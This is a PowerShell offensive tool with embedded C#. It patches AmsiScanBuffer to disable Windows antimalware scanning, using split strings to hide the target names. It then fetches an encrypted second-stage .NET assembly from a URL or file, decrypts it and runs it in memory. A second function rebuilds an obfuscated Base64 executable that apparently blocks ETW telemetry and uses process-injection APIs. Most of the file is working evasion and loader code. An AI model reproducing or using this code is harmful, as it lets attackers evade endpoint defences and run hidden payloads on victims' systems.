function Invoke-SA
{

Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $location,
        [Parameter(Mandatory=$true)]
	    [string]
        $password,
        [string]
        $argument,
        [string]
        $argument2,
        [string]
        $argument3,
        [Switch]
        $noArgs
	)
Invoke-BETW

$SA = @"
using System;
using System.Net;
using System.Text;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace SA
{
    public class gofor4msi
    {
        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

        public static void now()
        {
            if (is64Bit())
                gofor(x64);
            else
                gofor(x86);
        }

        private static void gofor(byte[] patch)
        {
            try
            {
                var a = "am";
                var si = "si";
                var dll = ".dll";
                var lib = Win32.LoadLibrary(a+si+dll);
                var Am = "Am";
                var siScan = "siScan";
                var Buffer = "Buffer";
                var addr = Win32.GetProcAddress(lib, Am+siScan+Buffer);

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
    }
    public class Program
    {
        public static void PrintBanner()
        {
              Console.WriteLine();
        }
        public static string Get_Stage2(string url)
        {
            try
            {
                HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);
                IWebProxy webProxy = myWebRequest.Proxy;
                if (webProxy != null)
                {
                    webProxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    myWebRequest.Proxy = webProxy;
                }
                HttpWebResponse response = (HttpWebResponse)myWebRequest.GetResponse();
                Stream data = response.GetResponseStream();
                string html = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    html = sr.ReadToEnd();
                }
                return html;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("\n[!] Whoops, there was a issue with the url...");
                Console.ResetColor();
                return null;
            }
        }
        public static string Get_Stage2disk(string filepath)
        {
            string folderPathToBinary = filepath;
            string base64 = System.IO.File.ReadAllText(folderPathToBinary);
            return base64;
        }
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            gofor4msi.now();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
        public static void Main(params string[] args)
        {
            PrintBanner();
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string location = args[0];
            string ishttp = "http";
            string Stage2;
            if (location.StartsWith(ishttp))
            {
                Console.Write("[*] One moment while getting our file from URL.... ");
                Stage2 = Get_Stage2(location);
            }
            else
            {
                Console.WriteLine("NO URL, loading from disk.");
                Console.Write("[*] One moment while getting our file from disk.... ");
                Stage2 = Get_Stage2disk(location);
            }
            Console.WriteLine("-> Done");
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(Stage2);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            object[] cmd = args.Skip(2).ToArray();
            loadAssembly(originalBytes, cmd);
        }
    }
}
"@

Add-Type -TypeDefinition $SA

if ($noArgs)
{
    [SA.Program]::Main("$location","$password")
}
elseif ($argument3)
{
    [SA.Program]::Main("$location","$password","$argument","$argument2", "$argument3")
}
elseif ($argument2)
{
    [SA.Program]::Main("$location","$password","$argument","$argument2")
}
elseif ($argument)
{
    [SA.Program]::Main("$location","$password","$argument")
}

}


function Invoke-BETW
{
    $bin64=("{58}{137}{239}{103}{83}{187}{183}{305}{249}{146}{159}{135}{41}{228}{14}{51}{153}{20}{69}{263}{22}{91}{30}{308}{44}{269}{172}{285}{19}{98}{185}{313}{165}{162}{147}{241}{190}{232}{104}{15}{251}{65}{210}{254}{245}{150}{270}{157}{87}{188}{294}{223}{81}{73}{281}{301}{85}{302}{235}{11}{12}{32}{53}{266}{186}{279}{234}{293}{122}{160}{86}{68}{236}{217}{43}{130}{105}{171}{155}{200}{231}{109}{250}{205}{38}{16}{92}{77}{142}{224}{17}{127}{163}{248}{111}{169}{145}{26}{52}{206}{164}{161}{118}{27}{274}{289}{5}{216}{46}{152}{37}{139}{304}{199}{291}{107}{42}{154}{128}{278}{96}{75}{243}{214}{144}{277}{176}{238}{94}{71}{184}{194}{151}{99}{39}{119}{287}{227}{62}{9}{300}{141}{191}{246}{108}{10}{7}{201}{196}{156}{257}{292}{271}{310}{314}{112}{90}{140}{237}{64}{219}{299}{222}{295}{84}{63}{136}{221}{259}{35}{61}{244}{230}{258}{3}{79}{195}{167}{59}{267}{47}{89}{110}{21}{209}{306}{101}{113}{298}{133}{260}{175}{29}{36}{180}{181}{18}{256}{97}{40}{106}{212}{132}{280}{76}{208}{49}{60}{70}{13}{218}{24}{204}{82}{178}{148}{168}{124}{125}{95}{284}{138}{115}{255}{179}{283}{220}{312}{93}{215}{233}{286}{297}{192}{25}{311}{275}{193}{174}{276}{56}{28}{100}{173}{303}{240}{0}{143}{116}{126}{296}{1}{74}{2}{4}{102}{134}{189}{80}{117}{67}{264}{121}{261}{78}{170}{34}{33}{309}{129}{273}{197}{72}{229}{202}{158}{226}{48}{177}{282}{123}{225}{23}{211}{207}{149}{252}{50}{54}{265}{307}{6}{268}{262}{88}{114}{31}{8}{213}{182}{55}{45}{288}{272}{57}{242}{247}{253}{198}{166}{66}{290}{131}{203}{120}"-f 'EJsb2NrRXR3LW1hc3RlclxCbG','AAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','ldEluZm9ybWF0aW9uAFF1ZXJ5SW5mb3JtYXRp','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','EAAAEpA','KICA','3J5V3','AAAAAAAAAAAAAAAAAAAAAAAA','5kbGUAaGFuZGxlAGhGaW','WaXJ0dWFsTWVtb','AAIAAkyC8DoABVwAAAAAAgACTIHAMkAFiAAAAAACAAJMgiwmdAWYAAAAAAIAA','kyCbCaoBbQAAAAAAgACTIMQHuwF3AAAAAACAAJMgzAPDAXkAAAAAAIAAkyDZB84BfQAAAAAAgACTILk','aG93V2luZG93AGJsb2NrZXR3AEFnZW50Lmhvb2tldHcAVmlydHVhbEFsbG9jRXgATnR','AAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADzQQAAAAAAAEgAAAACAAUA7CAAACggAAADAAIAAQAABgAAA','DA','CgYAqQCY','CQBYAWgACQBcAW','zcwBkd0Rlc2lyZWRBY2Nlc3MAZGVzaXJlZE','qAA0BEABzAAAASQA0ACoABQEAAH8LAABRADYAKgAFAQAAsAEAAFEARAAqAAUBAACfCwAAUQBIACoABQEAAIANAABRAEsAKgADAGcMigADABIDigADA','h4CKBMAAAoqAEJTSkIBAAEAAAAAAAwAAA','AGFsbG9jYXRpb25BdHRyaWJzAERsbENoYXJhY3RlcmlzdG','AAAAEgAAAAU','IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZG','G9hZExpY','AYCRgQCgkJGBAACgkYGBAYGB','MBQEAQAELABcJAQBAAQ0AJg4BAEABDwBaBQEAQAERAHIM','BIQD2DgEAAAEj','S4wLj','Q2','BBsMJBgAiBsMJBgDBBsMJBgCN','AAAAAAAAAAAAAAAAAAAAAAA','M2QGAAAAAAACAAJMgqw7kAYQAAAAAAIAAkyDTAvQB','yAGEAbgBzAGwAYQ','AAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAB','9yZGluYWwAYnl0ZXNBd','91','ABN','ChAAeQBgChAAmQBg','NUaHJlYWQATnRBbGVydFJlc3VtZVRocmVhZABDcmVhdGVUaHJlYWQAVW5pcXVlVGhyZWFkAGhUaHJlYWQATnRRdWVyeUluZm9ybW','ZVByb2Nlc3MAVW5pcXVlUHJvY2VzcwBoU','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAGCIAAAAgAAAAJAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKwFAAAAYAAAAAYAA','AAAAAAAAyAMUIAAAAAAQAAwAFAA','AN','gKBgAFBsMJBgDcBZ0H','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','QBAAABLQDrA','AGxwQnl0ZXNCdWZmZXIAYnVmZmVyAGxwUGFyYW1ldGVyAGhTdGRFcnJvcgAuY3RvcgBscFNlY3VyaXR5RGVzY3JpcHRvcgBVSW','awBlAHQAdwAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAA','1RocmVhZEF0dHJpYnV0ZUxpc3QAbHBBdHRyaWJ1dGVMaXN0AGhTdGRJbnB1dABoU3RkT3V0c','G','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBQBnAAAAAQAAESgQAAAKbxEAAAoKF40WAAABJRYgwwAAAJwLcgEAAHAoGAAABnIVAABwKBcAAAYMBggHjmlqKBIAAAofQBIDKBQ','AQBA','jwAAAAAAgACTIOQC/QGUAAAAAACAA','l0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAMAQAHM','AAAAAAAAAAAAAAAAAA','TVq','sZGVyAGxwQnV','HV0AFN5c3RlbS5UZXh','mFpbABBbGwAa2VybmVsMzIuZGxsAG50','5kbGUAVGhyZWFkSGFuZGxlAGhTb3VyY2VIYW5kbGUAQ2xvc2VIYW5kbGUARHVwbGljYXRlSGFuZGxlAExkckdldERsbEhhbmRsZQBTZWN0aW9uSGFuZGxlAGhTb3VyY2VQcm9jZXNzSGFuZGxlAGhUYXJnZXRQcm9jZXNzSGFuZGxlAHByb2Nlc3NIYW5kbGUAbHBUYXJnZXRIYW5kbGUAYkluaGVyaXRIYW','uZ1RvQW5z','pemUAZHdZU2','BjMCoABWgKQIqgBWgD0FqgBWgPgCqgBWgHQJqgBWgMECqgBWgEcFqgBWgLwDqgBWgEsMqgBWgEcCqgBWgFQJqgBWgGMJqgBWgP8IqgBWgJEHqgAGBjMCoABWgO8ErgBWgOEBrgBWgMMArgAGBj','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAA','CwKAAAEAFMHAgAFANEIAAABAGcMAAAC','B2NC4wLjMwMzE5AAAAAAUAbAAAACwNAAAjfgAAmA0AAFgPAAAjU3RyaW5ncwAAAADwHAAANAAAACNVUwAkHQAAEAAAACNHVUlEAAAANB0AAPQCAAAjQmxvYgAAAAAAAAACAAABVz0CFAkCAAAA+gEzABYAAAEAAAAX','0AHdT','FkAUEFHRV9FWEVDVVRFX1dSSVRFQ09QWQBkd1kAdmFsdWVfXwBSdW50aW1lRGF0YQBTZX','AADoADQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAYgBsAG8AYwBrAGUAdAB3AC4AZQB4AGUAAAAAAEgAEgABAEwAZQBnAGEAbABD','JMgCA4oATIAAAAAAIAAkyCwAygBMwAAAAAAgACTIPYOLQE0AAAAAACAAJMgBA8zATYAAAAAAIAAkyCc','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','TlNJX1NUUklORwBUSFJFQURfQ','X0V4cGxpY2l0AFNpemVPZlN0YWNrQ29tbWl0AGxwRW52aXJvbm1lbnQAUHJldmlvdXNTdXNwZW5kQ29','D4AF4ACQD8AGMACQAAAWgACQAEAW0ACQAIAXIACQAMAXcACQAUAXwACQAYAUAACQAcAUUA','TwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAA','b24AVml','AIAEAAAACAAAIAYAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAOAAAgAAAAAAAAAAAAAAAAAAAA','CTID4NIgEwAAAAAACAA','UHJvY2Vzc01l','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4','TdHJpbmcAUnRsVW5pY29kZVN0cml','yB6BFsBSgAAAAAAgACTIOsCZQFOAAAAAACAAJYgqgxqAU8AAAAAAI','cMAAACAO4MAAADACwKAAAEAHkHAAAFAKMCAAABAGcMAAACAAwNAAADAHkHAAAEACwFAAAFAHYNAAABAGcMAAACAO4MAAADA','AAYAAAAAA','EV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ','5','TdGFja1Jlc2VydmUAY','AAAABAAAAAwAAACMAAAABAAAAAgAAABAAAAAAACgHAQAAAAAABgBtBucKBgDaBucKBgCCBagKDwAHCwAABgCqBcMJBgB','DCQAqQCKAykAuQCtDS0AgQBgCgYACQDcADsACQDgAEAACQDkAEUACQDoAEoACQDsAE8ACQDwAFQACQD0AFkACQ','EBEkCQgAAwIYEUQRRAgABAIYCAgQGAoABwIYCRgYGBgYBwADGBFAAggLAAcCGBgYEBgJAgkVAAoCDg4Q','ZHdYAFBBR0VfUkVBRE9OTFkAUEFHRV9XUklURUNPU','QgAQECCQcGGB0FGAkYCQQAABJVAyAAGAQAA','EVVBMSUNBVEVfQ0xPU0VfU09VUkNFAFBBR0VfTk9DQUNIRQBQQUdFX1dSSVRFQ09NQklORQBOT05FAFBST1RFQ1RfRlJPTV9DTE9TRQBQQUdFX1JFQURXUklURQBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFAFBBR0VfRVhFQ1VURQBVTklDT0RFX1NUUklORwBB','jZXNzAENyZWF0','IQCjQADAFwCjQADAFACjQADAEMDkAADABQKkAADAE0EkAADAPcBjQAD','WQAYnl0ZXNSZWFkAFZpcnR1YWxNZW1vcnlSZWFkAE50UXVldWVBcG','AuMAA','BTZXJ2aWNlcwBTeXN0Z','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAQAAAAA','ADAGQLoAA','AAADAOkLAAAEAIkHAAAFAP8NAAAGAIMKAAAHAEcEAAABANwDAAACAAYEA','HJvY2VzcwBOdE9wZW5Qcm9jZXNzAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAR2V0UHJvY0FkZHJlc3MATGRyR2V0UHJvY2VkdXJ','ACFDgAABAAAAAAAAAAAAAAAMgBTAgAAAAAEAAAAAAA','0ZQB','EAAYEAAAFABYNAAAGAEoKAAAHADMDAAAIACUNAAAJALkNAAAKABUHAAALADUKAAABAJUDAAACAOQEAAADAAEAAAAEAD4AAAAFAEsAAAABAJUDAAACANkNAAABAJUDAAACAPALAAADAO0IAAAEACYIAAAFAFcIAAABAAYEAAACAPAMCQBgCgEAEQBgCgYAGQBgCgoAKQBgChAAMQBgChAAOQBgChAAQQBgChAASQBgCh','0UHRy','AAIwJ7AEAAQwJ7AEAAYwJ7AEAALwCGADYAhgA7AIYAPwCGAPEAiAAaAKgI','XplT2Z','W0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZEF0dHJpYnV0ZXMAbHBQaXBlQXR0cmlidXRlcwBscFByb2','1c3RJbmZvPg0KPC9hc3NlbWJseT4AAAAAAAAAAAAAAAAAAAAAAAAAAAA','AQAAAAQCAAAABAgAAAAEEAAAAAQgAAAABEAAAAAEgAAAAA','dHd','QAAAAAAgA','EdAAgOAQBAAR8AsAMBAAA','F0aW9uVGhyZWFkAENyZWF0ZVN1c3BlbmRlZABscFJlc2VydmVkAFNlY3VyaXR5UXVhbGl0eU9mU2Vy','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==','AA','AAD','AC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AM','AE24AdABkAGwAbAAuAGQAbABsAAAbRQB0AHcARQB2AGUAbgB0AFcAcgBpAHQAZQAAAAAADkZ4MR7Rjkm1zVKu86xh4QAEIAEBCAMgAAEFIAEB','EREEIAEBDg','cb2JqXFJlbGVhc2VcYmxvY','0ALgALABQCLgATAB0CLgAbADwCLgAjAEUCLgArAFMCLgAzAFMCLgA7AFMCLgBDAEUCLgBLAFkCLgB','AA0AAwAOAAMADwADABAAAwARAAMAEgADABMAAwAAAABBcGNBcmd1bWVudDEAS2VybmVsMzIAa2VybmVsMzIAV2luMzIAY2JSZXNlcnZlZDIAbHBSZXNlcnZlZDIAQXBjQXJndW1lbnQyAE','lAHMAYwByAGkAcAB0AGk','gEAAAGAM0NAAAHAFUEAAAIAPoJAAAJAPAJAAAKADsCAAALAJQLAAABAAYEAAACACEMAAADAF4LAAAEAJoCAAABANUJAAACAC8M','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','E9sZFByb3RlY3QAZmxQcm90ZWN0AEFsbG9jYXRpb25Qcm90ZWN0AGZsTmV3UHJvdGVj','ljYXRlT3B0aW9','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','ACgAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAL9BAABPAAAAAGAAAKwFAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAAAUQQAAOAAAAAAAAA','aVN0cmluZwBBbGxvY2F0ZURlc3RpbmF0aW9uU3RyaW5nAERsbFBh','QAAMAAAAE','wAE','QB+DAMAAAE3ALwOA','mxvY2t','dlUG','CQAkAUAACQAoAUUACQAwAXwACQA0AU8ACQA4AVQACQA8AVkAC','9ja0V0dy1tYXN0ZXJcYmxvY2tl','wBQQUdFX05PQ','ABCQA','AAAAAAGAAAAA','GoIpwADABgI','3RvcnkAQ','b3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJ','WgJ8AtgBWgKwAtgBQIAAAAACWAOgIugABAMMgAAAAAIYYYAoGAAIAyyAAAAAAhhhgCgYAAgAAAAAAgACTIAw','TnVtYmVyT2ZCeXRlc1JlY','gEAAAEvAKoMAgAAATEA6g4CAA','AAAYmBggHB45pEgQoEwAABiYGCAeOaWooEgAACgkSBSgUAAAGJioeAigTAAAKKh4CKBMAAAoqHgIoEwAACioeAigTAAAKK','MABgADAAcAAwAIAAMACQADAAoAAwALAAMADAAD','8NAAAHAIAHAAAIAN0JAAAJAC4FAAAKAFoNAAABAP4HACACALcHAAABABAIAAACAJUKAAADAKwE','RlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBkd0ZpbGxBdHRyaWJ1dGU','AAAAAACAAJMgFwnM','BvAGMAawBlAHQAdwAuAGUAeABlAAAAAAAyAAkAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGU','AAAA','AGAHAAAEALcCAAAFAJkIAAAGAGcDAAABAEAEAAACALsKAAABAEgOAAABAFINAAABAC0KAAACAHEIAAABAG','AHcBAQBAARkA/gQBAEABGwA+DQEAQA','CowADAIQInQADAE4PjQADAEoPjQADAGoIpwADABgIpwADADwKigADA','TAFMCLgBbAFMCLgBjAHEC','AABFQBLDAEARgEX','IjQADAGYKigADEDEEmgADADMNigADANAMigADAIQIigADAEoPigADAHQCnQADAGcCigADADMNoAADAN8MigADAJo','AAAA','WaWV3T2ZTZWN0aW9uAE50VW5tYXBWaWV3T2ZTZWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAHNlY3Rpb24ASW5oZXJpdERpc3Bvc2l0aW9uAFNoZWxsSW5mbwBEZXNrdG9wSW5mbwBscFN0YXJ0dXBJbmZvAGxwRGVza3RvcABTdHJpbmdCdWl','mFzZVByaW9yaXR5AAA','FwC1CA','QAAAAAAAAAAAAAA','AADAPAMAAAEACoNAAAFAGwHAAAGAJ','0BAABJABwAKQANABAAJAEA','ASQEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC41AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRIuTkVUIEZyYW1ld29yayA0LjUAAAAAAACproDMAAAAA','BgACCRgQCQkABQkYCBgIEAgFAAIJGBgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADQEACGJsb2NrZXR3AAAFAQAAAAA','wBkd09wdGlvbnMAZHdY','FX0FDQ0VTUwBJTkhFUklUAFNUQVJUVV','L','bW9yeQBXcml0ZVByb2Nlc3NNZW1vcnkAbHBDdXJyZW50RGlyZWN0b3J5AFJvb3REaXJlY','AAAAAQEAAAAAQIBFQ','bnRDaGFycw','Bkd1lDb3VudENoYXJzAHBQcm9jZXNzUGFyYW1ldGVycwBwQXR0cnMAVGhyZWFkSW5mb3JtYXRpb25DbGFzcwBwcm9jZXNzSW5mb3JtYXRpb25DbGF','AAAAAA','TAEDAItqxqAAAAAAAAAAAOAAIgALATAAACQAAAAIAAAAAAAAEkIAAAAgAAAAYAAAAA','RRdW90YQBjY','AC8CjQADADUHjQADAD0HjQADALoLjQADAMgLjQADAPUFjQADAJILjQADAHkOkwADACYAkwADADIAigADAFgOigADAGIOigADAFYKigADAAg','AAADADkLAAAEAFMHAAABAFINAAACAH0IAAADAJILAAABAEgOAAACAO4NAAADAJILAAAEAFkHAAABAEgOAAACAJILAAADAO4GAAAEAP0GAAAFAEUHAAAGAAUHAAAHAEwHAAABAD0MAAACA','gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAA','IAAkyAmDt','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','A','F0aE5hbWUARGxsT','E4EBE8DAAHCR','EBgPAAsJEBgJGBgYGAIJCQkYCAAFCRgYGBgY','gBtc2NvcmxpYgBkd1RocmVhZElkAEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQAZHdQcm9jZXNzSWQAcHJvY2Vzc0lkAENsaWVudElkAGxw','ydHVhbE1lbW9yeU9wZXJhdGlvbgBOdENyZWF0ZVNlY3Rpb24ATnRNYXB','pYnV0ZQBHdWlkQXR0cmlidX','wBuAAAAAABiAGwAbwBjAGsAZQB0AHcAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','JAwAAAT8AxAcDAAABQQDMAwMAAAFDANkHAwAAAUUAuQwDAAABRwCrDgMAAAFJANMCAwAAAUsA5AIDAAABTQAaAwMAAAF','AAAEANIDAAABAP4HAAACALcHAAA','JpdGUAVXBkYXRlUHJvY1RocmVhZEF0dHJ','ABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAQgANAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAGIAbA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','nJhcnkAUnRsWmVyb01lbW9yeQBSZWFk','BgChAAcQBg','ARMAvAMBA','HhtbG5zPSJ1cm46c2NoZW1hcy1taWNy','1bnQAZHdBdHRyaWJ1dGVDb3VudABwYWdlUHJvdABEZWxldGVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdABJbml0aWFsaXplUHJvY','ljcwBTeXN0ZW0uRGlhZ25vc3RpY3MAbWlsbGlzZWNvbmRzAFN5','MCoABWgIgAsgBWgMsBsgAGBjMCoABWgL4AtgBWgPwA','Fsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5I','lQWRkcmVzcwBQZWJCYXNlQWRkcmVzcwBUZWJCYXNlQWRkcmVzcwBscEJhc2VBZGRyZXNzAEZ1bmN0aW9uQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFkZHJlc3MAU3RhY2taZXJvQml0cwBFeGl0U3RhdHVzAFdhaXRGb3JTaW5nbGVPYmplY3QAaE9iamVjdABXaW4zMlByb3RlY3QAbHBmb','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAADAAAABQyAAAAAAAAAAAAAAAAAA','BTkRMRV9GTEFHU','ESQQESQCCRgOEBEgEBEYAwAACAoABgIYG','NkOAQBAASsAeg','AgADAJQEAAAEAHcHAAABABIDAAABAGEEAAACAGkEAAABANEE